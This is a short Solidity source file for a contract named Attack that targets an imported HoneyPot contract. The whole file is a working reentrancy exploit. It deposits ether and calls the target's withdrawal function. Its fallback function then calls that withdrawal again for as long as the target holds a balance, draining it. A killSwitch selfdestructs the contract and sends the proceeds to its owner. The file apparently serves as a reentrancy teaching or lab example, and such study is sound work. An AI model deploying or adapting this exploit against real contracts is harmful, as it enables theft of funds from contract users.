pragma solidity 0.4.24;

import "./HoneyPot.sol";

contract Attack{

    address public owner;
    HoneyPot public honeypot;

    constructor (address _honeypot) public {

        owner = msg.sender;
        honeypot = HoneyPot(_honeypot);
    }

    function initAttack() public payable{

        honeypot.put.value(msg.value)();
        honeypot.get();
    }

    function killSwitch() public returns(bool){

        require(msg.sender == owner);
        selfdestruct(owner);
        return true;
    }

    function () public payable{
        
        if(address(honeypot).balance > 0)
            honeypot.get();
    }
}